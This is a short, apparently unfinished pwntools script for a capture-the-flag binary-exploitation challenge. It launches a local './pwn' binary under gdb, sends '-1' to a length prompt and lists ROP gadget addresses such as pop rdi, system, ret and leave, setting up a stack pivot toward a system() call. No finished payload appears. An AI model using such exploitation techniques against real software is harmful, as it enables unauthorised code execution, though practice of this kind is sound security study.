from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-v']

p = process('./pwn')
gdb.attach(p, 'b main')
p.sendlineafter(b'introduction.\n', b'-1')
pop_rdi = 0x401219
system = 0x401230
desc = 0x404060
ret = 0x40101a
leave =0x40120f

#p.sendafter(b'number:\n', b'0')
p.interactive()